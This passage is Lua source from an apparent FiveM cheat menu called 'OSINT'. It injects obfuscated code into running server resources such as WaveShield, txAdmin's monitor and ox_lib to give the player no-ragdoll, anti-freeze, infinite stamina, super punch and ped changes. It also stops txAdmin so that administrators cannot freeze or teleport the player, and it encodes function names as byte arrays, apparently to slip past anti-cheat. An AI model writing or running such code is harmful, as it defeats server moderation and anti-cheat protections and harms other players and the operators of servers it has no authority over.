                                                            clearTasks(ped)
                                                        end
                                                    end
                                                end

                                                local ped = getPed()
                                                if ped and ped ~= 0 then
                                                    setCanRagdoll(ped, true)
                                                    setRagdollOnCollision(ped, true)
                                                    setRagdollFromImpact(ped, true)
                                                end
                                            end)
                                        ]])
                                    else
                                        Injection(targetRes, [[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedCanRagdoll", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedRagdollOnCollision", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedCanRagdollFromPlayerImpact", function(originalFn, ...) return originalFn(...) end)
                                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsPedRagdoll", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                            if noRagdollEnabled == nil then noRagdollEnabled = false end
                                            noRagdollEnabled = true

                                            local function startNoRagdoll()
                                                local create = CreateThread
                                                local wait = Wait
                                                local pedId = PlayerPedId
                                                local setCan = SetPedCanRagdoll
                                                local setColl = SetPedRagdollOnCollision
                                                local setImpact = SetPedCanRagdollFromPlayerImpact
                                                local isRag = IsPedRagdoll
                                                local clear = ClearPedTasksImmediately

                                                create(function()
                                                    while noRagdollEnabled and not Unloaded do
                                                        local ped = pedId()
                                                        if ped and ped ~= 0 then
                                                            setCan(ped, false)
                                                            setColl(ped, false)
                                                            setImpact(ped, false)
                                                            if isRag(ped) then
                                                                clear(ped)
                                                            end
                                                        end
                                                        wait(0)
                                                    end

                                                    -- Restore
                                                    local ped = pedId()
                                                    if ped and ped ~= 0 then
                                                        setCan(ped, true)
                                                        setColl(ped, true)
                                                        setImpact(ped, true)
                                                    end
                                                end)
                                            end

                                            startNoRagdoll()
                                        ]])
                                        OSINT:Notify("success", "OSINT", "No Ragdoll Enabled (Fallback)", 3000)
                                    end
                                else
                                    if waveStarted then
                                        OSINT:Notify("success", "OSINT", "No Ragdoll Disabled", 3000)
                                        Injection(GetResourceState("lb-phone") == "started" and "lb-phone" or "WaveShield", [[
                                            noRagdollEnabled = false
                                        ]])
                                    else
                                        Injection(targetRes, [[
                                            noRagdollEnabled = false
                                        ]])
                                        OSINT:Notify("success", "OSINT", "No Ragdoll Disabled (Fallback)", 3000)
                                    end
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Anti-Freeze",
                            checked = false,
                            desc = "This will prevent you from being frozen.",
                            onSelect = function(checked)
                                local waveStarted = GetResourceState("WaveShield") == 'started'
                                local targetRes = (GetResourceState("monitor") == "started" and "monitor")
                                    or (GetResourceState("ox_lib") == "started" and "ox_lib")
                                    or "any"

                                if checked then
                                    if waveStarted then
                                        OSINT:Notify("success", "OSINT", "Anti-Freeze Enabled", 3000)
                                        Injection(GetResourceState("lb-phone") == "started" and "lb-phone" or "WaveShield", [[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if antiFreezeEnabled == nil then antiFreezeEnabled = false end
                                            antiFreezeEnabled = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local getPed = PlayerPedId
                                                local isFrozen = IsEntityPositionFrozen
                                                local unfreeze = FreezeEntityPosition
                                                local clearTasks = ClearPedTasks

                                                while antiFreezeEnabled and not Unloaded do
                                                    Wait(0)
                                                    local ped = getPed()
                                                    if ped and ped ~= 0 and isFrozen(ped) then
                                                        unfreeze(ped, false)
                                                        clearTasks(ped)
                                                    end
                                                end
                                            end)
                                        ]])
                                    else
                                        Injection(targetRes, [[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
                                            hNative("ClearPedTasks", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsEntityPositionFrozen", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                            if antiFreezeEnabled == nil then antiFreezeEnabled = false end
                                            antiFreezeEnabled = true

                                            local function startAntiFreeze()
                                                local create = CreateThread
                                                local wait = Wait
                                                local pedId = PlayerPedId
                                                local isFrozen = IsEntityPositionFrozen
                                                local unfreeze = FreezeEntityPosition
                                                local clear = ClearPedTasks

                                                create(function()
                                                    while antiFreezeEnabled and not Unloaded do
                                                        local ped = pedId()
                                                        if ped and ped ~= 0 and isFrozen(ped) then
                                                            unfreeze(ped, false)
                                                            clear(ped)
                                                        end
                                                        wait(0)
                                                    end
                                                end)
                                            end

                                            startAntiFreeze()
                                        ]])
                                        OSINT:Notify("success", "OSINT", "Anti-Freeze Enabled (Fallback)", 3000)
                                    end
                                else
                                    if waveStarted then 
                                        OSINT:Notify("error", "OSINT", "Anti-Freeze Disabled", 3000)
                                        Injection(GetResourceState("lb-phone") == "started" and "lb-phone" or "WaveShield", [[
                                            antiFreezeEnabled = false
                                        ]])
                                    else
                                        Injection(targetRes, [[
                                            antiFreezeEnabled = false
                                        ]])
                                        OSINT:Notify("error", "OSINT", "Anti-Freeze Disabled (Fallback)", 3000)
                                    end
                                end
                            end
                        },
                        { type = "checkbox", label = "Force Third Person", checked = false, desc = "This will force third person.",
                            onSelect = function(checked)
                                if checked then
                                Injection(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[


                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetFollowVehicleCamViewMode", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetFollowPedCamViewMode", function(originalFn, ...) return originalFn(...) end)

                                if kJfGhTrEeWqAsDz == nil then kJfGhTrEeWqAsDz = false end
                                kJfGhTrEeWqAsDz = true

                                local function pqkTRWZ38y()
                                    local gKdNqLpYxMiV = CreateThread
                                    gKdNqLpYxMiV(function()
                                        while kJfGhTrEeWqAsDz and not Unloaded do
                                            local qWeRtYuIoPlMnBv = SetFollowPedCamViewMode
                                            local aSdFgHjKlQwErTy = SetFollowVehicleCamViewMode

                                            qWeRtYuIoPlMnBv(0)
                                            aSdFgHjKlQwErTy(0)
                                            Wait(0)
                                        end
                                    end)
                                end

                                pqkTRWZ38y()
                                ]])
                                else
                                Injection(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[

                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetFollowVehicleCamViewMode", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetFollowPedCamViewMode", function(originalFn, ...) return originalFn(...) end)

                                kJfGhTrEeWqAsDz = false
                                ]])
                                end
                            end
                        },
                        { type = "checkbox", label = "Force Driveby", checked = false, desc = "This will enable driveby if disabled.",
                            onSelect = function(checked)
                                if checked then
                                Injection(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[


                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetPlayerCanDoDriveBy", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                if zXcVbNmQwErTyUi == nil then zXcVbNmQwErTyUi = false end
                                zXcVbNmQwErTyUi = true

                                local function UEvLBcXqM6()
                                    local cVbNmAsDfGhJkLz = CreateThread
                                    cVbNmAsDfGhJkLz(function()
                                        while zXcVbNmQwErTyUi and not Unloaded do
                                            local lKjHgFdSaZxCvBn = SetPlayerCanDoDriveBy
                                            local eRtYuIoPaSdFgHi = PlayerPedId()

                                            lKjHgFdSaZxCvBn(eRtYuIoPaSdFgHi, true)
                                            Wait(0)
                                        end
                                    end)
                                end

                                UEvLBcXqM6()
                                ]])
                                else
                                Injection(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[

                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetPlayerCanDoDriveBy", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                zXcVbNmQwErTyUi = false
                                ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Infinite Stamina",
                            checked = false,
                            desc = "This will enable Infinite Stamina.",
                            onSelect = function(checked)
                                if checked then
                                    OSINT:Notify("success", "OSINT", "Infinite Stamina On", 3000)

                                    if GetResourceState("WaveShield") == "started" then
                                        Injection(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            if not _G.infiniteStaminaEnabled then
                                                _G.infiniteStaminaEnabled = true

                                                local GetPlayerId_fn      = g({80,108,97,121,101,114,73,100})
                                                local RestoreStamina_fn   = g({82,101,115,116,111,114,101,80,108,97,121,101,114,83,116,97,109,105,110,97})
                                                local Wait_fn             = g({87,97,105,116})

                                                local function initFlow(cb)
                                                    local co = coroutine.create(cb)
                                                    local function execCycle()
                                                        while coroutine.status(co) ~= "dead" do
                                                            local ok, err = coroutine.resume(co)
                                                            if not ok then
                                                                print("^1[InfiniteStamina] Coroutine error:^7", err)
                                                                break
                                                            end
                                                            Wait_fn(0)
                                                        end
                                                    end
                                                    execCycle()
                                                end

                                                initFlow(function()
                                                    while _G.infiniteStaminaEnabled do
                                                        local pid = GetPlayerId_fn()
                                                        if pid then
                                                            RestoreStamina_fn(pid, 1.0)
                                                        end
                                                        Wait_fn(0)
                                                    end
                                                end)
                                            end
                                        ]])
                                    else
                                        MachoInjectResourceRaw("any", [[
                                            if _G.staminaThreadActive == nil then _G.staminaThreadActive = false end
                                            if _G.infiniteStaminaEnabled == nil then
                                                _G.infiniteStaminaEnabled = true

                                                local function ThreadStart()
                                                    local CreateThread_fn = CreateThread
                                                    local Wait_fn         = Wait
                                                    local PlayerId_fn     = PlayerId
                                                    local Restore_fn      = RestorePlayerStamina

                                                    CreateThread_fn(function()
                                                        while true do
                                                            Wait_fn(0)
                                                            if not _G.infiniteStaminaEnabled then
                                                                Wait_fn(500)
                                                                goto continue
                                                            end

                                                            local pid = PlayerId_fn()
                                                            if pid then
                                                                Restore_fn(pid, 1.0)
                                                            end

                                                            ::continue::
                                                        end
                                                    end)
                                                end

                                                ThreadStart()
                                            end
                                            _G.infiniteStaminaEnabled = true
                                        ]])
                                    end
                                else
                                    OSINT:Notify("error", "OSINT", "Infinite Stamina Off", 3000)

                                    if GetResourceState("WaveShield") == "started" then
                                        Injection(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                                            _G.infiniteStaminaEnabled = false
                                        ]])
                                    else
                                        MachoInjectResourceRaw("any", [[
                                            _G.infiniteStaminaEnabled = false
                                        ]])
                                    end
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Tiny Ped",
                            checked = false,
                            desc = "This will turn you into a tiny ped.",
                            onSelect = function(checked)
                                local injectTarget =
                                    (GetResourceState("WaveShield") == "started" and "WaveShield") or
                                    (GetResourceState("monitor") == "started" and "monitor") or
                                    (GetResourceState("ox_lib") == "started" and "ox_lib") or
                                    "any"

                                if checked then
                                    Injection(injectTarget, [[
                                        if not _G.OSINTTinyPedInjected then
                                            _G.OSINTTinyPedInjected = true
                                            _G.OSINTTinyPedEnabled = true

                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then
                                                    return
                                                end
                                                _G[nativeName] = function(...)
                                                    return newFunction(originalNative, ...)
                                                end
                                            end

                                            hNative("SetPedConfigFlag", function(originalFn, ...) return originalFn(...) end)

                                            -- One-shot initflow (no looping)
                                            function initflow(name, fn)
                                                if not _G.__flows then _G.__flows = {} end
                                                if _G.__flows[name] then
                                                    _G.__flows[name].active = false
                                                end
                                                local flow = { active = true }
                                                _G.__flows[name] = flow

                                                SetTimeout(0, function()
                                                    if flow.active then
                                                        fn()
                                                    end
                                                end)
                                            end
                                        else
                                            _G.OSINTTinyPedEnabled = true
                                        end

                                        initflow("TinyPedOnce", function()
                                            local ped = PlayerPedId()
                                            if ped and ped ~= 0 then
                                                SetPedConfigFlag(ped, 223, true)
                                            end
                                        end)
                                    ]])
                                else
                                    Injection(injectTarget, [[
                                        _G.OSINTTinyPedEnabled = false
                                        local ped = PlayerPedId()
                                        if ped and ped ~= 0 then
                                            SetPedConfigFlag(ped, 223, false)
                                        end
                                    ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Super Punch",
                            checked = false,
                            onSelect = function(checked)
                                local waveStarted = GetResourceState("WaveShield") == 'started'
                                local targetRes = (GetResourceState("monitor") == "started" and "monitor")
                                    or (GetResourceState("ox_lib") == "started" and "ox_lib")
                                    or "any"

                                if checked then
                                    if waveStarted then
                                        OSINT:Notify("success", "OSINT", "Super Punch Enabled", 3000)
                                        Injection(GetResourceState("lb-phone") == "started" and "lb-phone" or "WaveShield", [[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if superPunchEnabled == nil then superPunchEnabled = false end
                                            superPunchEnabled = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local setMeleeMod = SetPlayerMeleeWeaponDamageModifier
                                                local setVehicleMod = SetPlayerVehicleDamageModifier
                                                local setWeaponMod = SetWeaponDamageModifier
                                                local playerId = PlayerId
                                                local unarmedHash = GetHashKey("WEAPON_UNARMED")
                                                local damageValue = 150.0

                                                while superPunchEnabled and not Unloaded do
                                                    Wait(0)
                                                    local pid = playerId()
                                                    setMeleeMod(pid, damageValue)
                                                    setVehicleMod(pid, damageValue)
                                                    setWeaponMod(unarmedHash, damageValue)
                                                end

                                                -- Restore on disable
                                                local pid = playerId()
                                                setMeleeMod(pid, 1.0)
                                                setVehicleMod(pid, 1.0)
                                                setWeaponMod(unarmedHash, 1.0)
                                            end)
                                        ]])
                                    else
                                        Injection(targetRes, [[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPlayerMeleeWeaponDamageModifier", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPlayerVehicleDamageModifier", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetWeaponDamageModifier", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerId", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)

                                            if superPunchEnabled == nil then superPunchEnabled = false end
                                            superPunchEnabled = true

                                            local function startSuperPunch()
                                                local create = CreateThread
                                                local wait = Wait
                                                local setMelee = SetPlayerMeleeWeaponDamageModifier
                                                local setVehicle = SetPlayerVehicleDamageModifier
                                                local setWeapon = SetWeaponDamageModifier
                                                local getPlayer = PlayerId
                                                local hashKey = GetHashKey

                                                create(function()
                                                    local unarmedHash = hashKey("WEAPON_UNARMED")
                                                    local damageValue = 150.0

                                                    while superPunchEnabled and not Unloaded do
                                                        local pid = getPlayer()
                                                        setMelee(pid, damageValue)
                                                        setVehicle(pid, damageValue)
                                                        setWeapon(unarmedHash, damageValue)
                                                        wait(0)
                                                    end

                                                    -- Restore
                                                    local pid = getPlayer()
                                                    setMelee(pid, 1.0)
                                                    setVehicle(pid, 1.0)
                                                    setWeapon(unarmedHash, 1.0)
                                                end)
                                            end

                                            startSuperPunch()
                                        ]])
                                        OSINT:Notify("success", "OSINT", "Super Punch Enabled (Fallback)", 3000)
                                    end
                                else
                                    if waveStarted then
                                        OSINT:Notify("error", "OSINT", "Super Punch Disabled", 3000)
                                        Injection(GetResourceState("lb-phone") == "started" and "lb-phone" or "WaveShield", [[
                                            superPunchEnabled = false
                                        ]])
                                    else
                                        Injection(targetRes, [[
                                            superPunchEnabled = false
                                        ]])
                                        OSINT:Notify("error", "OSINT", "Super Punch Disabled (Fallback)", 3000)
                                    end
                                end
                            end
                        },
                        { type = "divider", label = "txAdmin Options" },
                        { type = "checkbox", label = "txAdmin Player IDs", checked = false, desc = "This will toggle txAdmin Player ids.",
                            onSelect = function(checked)
                                -- if GetResourceState("WaveShield") == "started" then
                                --     OSINT:Notify("error", "OSINT", "Ban Prevention: Cannot Use this on WaveShield", 3000)
                                --     return
                                -- end

                                if checked then
                                MachoInjectResource2(AsThreadNs, 'monitor', [[
                                menuIsAccessible = true
                                toggleShowPlayerIDs(true, true)
                                ]])
                                else
                                MachoInjectResource2(AsThreadNs, 'monitor', [[
                                menuIsAccessible = true
                                toggleShowPlayerIDs(false, true)
                                ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "txAdmin Noclip",
                            checked = false,
                            desc = "This will toggle txAdmin noclip.",
                            onSelect = function(checked)
                                -- if GetResourceState("ReaperV4") == "started" or GetCurrentServerEndpoint() ~= "216.146.24.88:30120" then
                                --     OSINT:Notify("error", "OSINT", "Ban Prevention: Cannot Use this on ReaperV4", 3000)
                                --     return
                                -- end

                                if checked then
                                    if GetResourceState("WaveShield") == "started" then
                                        TriggerEvent("txcl:setPlayerMode", "noclip", true)
                                    else
                                        MachoInjectResource2(3, "monitor", [[
                                            menuIsAccessible = true
                                            toggleShowPlayerIDs(true, true)
                                        ]])
                                    end
                                else
                                    if GetResourceState("WaveShield") == "started" then
                                        TriggerEvent("txcl:setPlayerMode", "none", true)
                                    else
                                        MachoInjectResource2(3, "monitor", [[
                                            menuIsAccessible = true
                                            toggleShowPlayerIDs(false, true)
                                        ]])
                                    end
                                end
                            end,
                        },
                        { type = "checkbox", label = "Disable All txAdmin", checked = false, desc = "This will disable txAdmin options from admins using them against you.",
                            onSelect = function(checked)
                                if checked then
                                MachoResourceStop("monitor")
                                print('started')
                                else
                                print('stopped')
                                MachoResourceStart("monitor")
                                end
                            end
                        },                        
                        { type = "checkbox", label = "Disable txAdmin Teleport", checked = false, desc = "This will disable txAdmin Teleport.",
                            onSelect = function(checked)
                                if checked then
                                MachoResourceStop("monitor")
                                print('started')
                                else
                                print('stopped')
                                MachoResourceStart("monitor")
                                end
                            end
                        },
                        { type = "checkbox", label = "Disable txAdmin Freeze", checked = false, desc = "This will disable txAdmin Freeze.",
                            onSelect = function(checked)
                                if checked then
                                MachoResourceStop("monitor")
                                print('started')
                                else
                                print('stopped')
                                MachoResourceStart("monitor")
                                end
                            end
                        },
                    }
                },
                {
                    label = "Wardrobe",
                    tabs = {
                        { icon = "", type = "scrollable", value = 1, values = { "Random" }, label = "Outfit", desc = "Apply a preset outfit",
                            onSelect = function(value)
                                if value == "Random" then
                                    Injection("any", [[
                                        local function UxrKYLp378()
                                            local UwEsDxCfVbGtHy = PlayerPedId
                                            local FdSaQwErTyUiOp = GetNumberOfPedDrawableVariations
                                            local QwAzXsEdCrVfBg = SetPedComponentVariation
                                            local LkJhGfDsAqWeRt = SetPedHeadBlendData
                                            local MnBgVfCdXsZaQw = SetPedHairColor
                                            local RtYuIoPlMnBvCx = GetNumHeadOverlayValues
                                            local TyUiOpAsDfGhJk = SetPedHeadOverlay
                                            local ErTyUiOpAsDfGh = SetPedHeadOverlayColor
                                            local DfGhJkLzXcVbNm = ClearPedProp

                                            local function PqLoMzNkXjWvRu(component, exclude)
                                                local ped = UwEsDxCfVbGtHy()
                                                local total = FdSaQwErTyUiOp(ped, component)
                                                if total <= 1 then return 0 end
                                                local choice = exclude
                                                while choice == exclude do
                                                    choice = math.random(0, total - 1)
                                                end
                                                return choice
                                            end

                                            local function OxVnBmCxZaSqWe(component)
                                                local ped = UwEsDxCfVbGtHy()
                                                local total = FdSaQwErTyUiOp(ped, component)
                                                return total > 1 and math.random(0, total - 1) or 0
                                            end

                                            local ped = UwEsDxCfVbGtHy()

                                            QwAzXsEdCrVfBg(ped, 11, PqLoMzNkXjWvRu(11, 15), 0, 2)
                                            QwAzXsEdCrVfBg(ped, 6, PqLoMzNkXjWvRu(6, 15), 0, 2)
                                            QwAzXsEdCrVfBg(ped, 8, 15, 0, 2)
                                            QwAzXsEdCrVfBg(ped, 3, 0, 0, 2)
                                            QwAzXsEdCrVfBg(ped, 4, OxVnBmCxZaSqWe(4), 0, 2)

                                            local face = math.random(0, 45)
                                            local skin = math.random(0, 45)
                                            LkJhGfDsAqWeRt(ped, face, skin, 0, face, skin, 0, 1.0, 1.0, 0.0, false)

                                            local hairMax = FdSaQwErTyUiOp(ped, 2)
                                            local hair = hairMax > 1 and math.random(0, hairMax - 1) or 0
                                            QwAzXsEdCrVfBg(ped, 2, hair, 0, 2)
                                            MnBgVfCdXsZaQw(ped, 0, 0)

                                            local brows = RtYuIoPlMnBvCx(2)
                                            TyUiOpAsDfGhJk(ped, 2, brows > 1 and math.random(0, brows - 1) or 0, 1.0)
                                            ErTyUiOpAsDfGh(ped, 2, 1, 0, 0)

                                            DfGhJkLzXcVbNm(ped, 0)
                                            DfGhJkLzXcVbNm(ped, 1)
                                        end

                                        UxrKYLp378()
                                    ]])
                                end
                            end
                        },
                        { type = "divider", label = "Ped Options" },
                        {
                            type = "scrollable",
                            label = "Freemode",
                            scrollType = "onEnter",
                            value = 1,
                            values = {
                                "Freemode Male", "Freemode Female"
                            },
                            onSelect = function(value)
                                MachoInjectResourceRaw("any", ([[
                                    local selected = "%s"
                                    local pedModel = nil

                                    if selected == "Freemode Male" then pedModel = "mp_m_freemode_01"
                                    elseif selected == "Freemode Female" then pedModel = "mp_f_freemode_01"
                                    end

                                    if pedModel then
                                        local modelHash = GetHashKey(pedModel)
                                        RequestModel(modelHash)
                                        while not HasModelLoaded(modelHash) do
                                            Wait(0)
                                        end

                                        SetPlayerModel(PlayerId(), modelHash)
                                        SetModelAsNoLongerNeeded(modelHash)

                                        local playerPed = PlayerPedId()
                                        SetPedDefaultComponentVariation(playerPed)
                                        SetPedRandomComponentVariation(playerPed, true)
                                        SetPedRandomProps(playerPed)
                                        SetEntityInvincible(playerPed, false)
                                        ClearPedTasksImmediately(playerPed)

                                        print("Changed ped to: " .. pedModel)
                                    else
                                        print("Invalid ped selected: " .. tostring(selected))
                                    end
                                ]]):format(value))
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Peds",
                            scrollType = "onEnter",
                            value = 1,
                            values = {
                                "Michael", "Franklin", "Trevor", "Lamar", "Jimmy", "Amanda", "Tracey", "Ron", "Wade", "Dave Norton", 
                                "Steve Haines", "Devin Weston", "Floyd", "Chef", "Lester", "Chop", "Brad", 
                                "Police Officer Male", "Police Officer Female", "SWAT", "Sheriff Male", "Sheriff Female",
                                "Highway Cop", "FIB Male", "FIB Female", "Paramedic", "Firefighter", "Doctor",
                                "Construction Worker", "Pilot Male", "Pilot Female", "Business Male", "Business Female",
                                "Street Dealer", "Gang Male 1", "Gang Male 2", "Gang Female 1", "Ballas 1", "Ballas 2", "Ballas Female",
                                "Families 1", "Families 2", "Vagos 1", "Vagos 2", "Lost MC 1", "Lost MC 2", "Lost MC Female",
                                "Army Soldier", "Marine 1", "Marine 2", "Prisoner Male", "Prison Guard", "Cop Undercover",
                                "Security Guard", "Janitor", "Hobo Male", "Hobo Female", "Prostitute 1", "Prostitute 2",
                                "Beach Male", "Beach Female", "Tourist Male", "Tourist Female", "Skater", "Hipster Male", "Hipster Female",
                                "Bouncer", "Shopkeeper", "Chef", "Bartender", "Waiter", "Mechanic", "Taxi Driver", "Gardener", "Farmer",
                                "Dock Worker", "Trash Worker", "Postal Worker", "Bus Driver", "Pilot", "Air Hostess",
                                "Cop Traffic", "Cop Detective", "Agent", "Reporter", "News Cameraman",
                                "Hunter", "Hiker Male", "Hiker Female", "Golfer Male", "Golfer Female", "Tennis Player Male", "Tennis Player Female"
                            },
                            onSelect = function(value)
                                MachoInjectResourceRaw("any", ([[
                                    local selected = "%s"
                                    local pedModel = nil

                                    if selected == "Michael" then pedModel = "player_zero"
                                    elseif selected == "Franklin" then pedModel = "player_one"
                                    elseif selected == "Trevor" then pedModel = "player_two"
                                    elseif selected == "Lamar" then pedModel = "ig_lamardavis"
                                    elseif selected == "Jimmy" then pedModel = "ig_jimmydisanto"
                                    elseif selected == "Amanda" then pedModel = "ig_amandatownley"
                                    elseif selected == "Tracey" then pedModel = "ig_tracydisanto"
                                    elseif selected == "Ron" then pedModel = "ig_ronsch"
                                    elseif selected == "Wade" then pedModel = "ig_wade"
                                    elseif selected == "Dave Norton" then pedModel = "ig_davenorton"
                                    elseif selected == "Steve Haines" then pedModel = "ig_stevehains"
                                    elseif selected == "Devin Weston" then pedModel = "ig_devin"
                                    elseif selected == "Floyd" then pedModel = "ig_floyd"
                                    elseif selected == "Chef" then pedModel = "ig_chef"
                                    elseif selected == "Lester" then pedModel = "ig_lestercrest"
                                    elseif selected == "Chop" then pedModel = "a_c_chop"
                                    elseif selected == "Brad" then pedModel = "ig_brad"
                                    elseif selected == "Police Officer Male" then pedModel = "s_m_y_cop_01"
                                    elseif selected == "Police Officer Female" then pedModel = "s_f_y_cop_01"
                                    elseif selected == "SWAT" then pedModel = "s_m_y_swat_01"
                                    elseif selected == "Sheriff Male" then pedModel = "s_m_y_sheriff_01"
                                    elseif selected == "Sheriff Female" then pedModel = "s_f_y_sheriff_01"
                                    elseif selected == "Highway Cop" then pedModel = "s_m_y_hwaycop_01"
                                    elseif selected == "FIB Male" then pedModel = "s_m_m_fibsec_01"
                                    elseif selected == "FIB Female" then pedModel = "s_f_m_fiboffice_02"
                                    elseif selected == "Paramedic" then pedModel = "s_m_m_paramedic_01"
                                    elseif selected == "Firefighter" then pedModel = "s_m_y_fireman_01"
                                    elseif selected == "Doctor" then pedModel = "s_m_m_doctor_01"
                                    elseif selected == "Construction Worker" then pedModel = "s_m_y_construct_01"
                                    elseif selected == "Pilot Male" then pedModel = "s_m_m_pilot_02"
                                    elseif selected == "Pilot Female" then pedModel = "s_f_y_airhostess_01"
                                    elseif selected == "Business Male" then pedModel = "s_m_y_business_01"
                                    elseif selected == "Business Female" then pedModel = "s_f_y_business_01"
                                    elseif selected == "Street Dealer" then pedModel = "g_m_y_mexgoon_02"
                                    elseif selected == "Gang Male 1" then pedModel = "g_m_y_ballaorig_01"
                                    elseif selected == "Gang Male 2" then pedModel = "g_m_y_ballasout_01"
                                    elseif selected == "Gang Female 1" then pedModel = "g_f_y_ballas_01"
                                    elseif selected == "Ballas 1" then pedModel = "g_m_y_ballaeast_01"
                                    elseif selected == "Ballas 2" then pedModel = "g_m_y_ballasout_01"
                                    elseif selected == "Ballas Female" then pedModel = "g_f_y_ballas_01"
                                    elseif selected == "Families 1" then pedModel = "g_m_y_famca_01"
                                    elseif selected == "Families 2" then pedModel = "g_m_y_famdnf_01"
                                    elseif selected == "Vagos 1" then pedModel = "g_m_y_mexgoon_01"
                                    elseif selected == "Vagos 2" then pedModel = "g_m_y_mexgoon_03"
                                    elseif selected == "Lost MC 1" then pedModel = "g_m_y_lost_01"
                                    elseif selected == "Lost MC 2" then pedModel = "g_m_y_lost_02"
                                    elseif selected == "Lost MC Female" then pedModel = "g_f_y_lost_01"
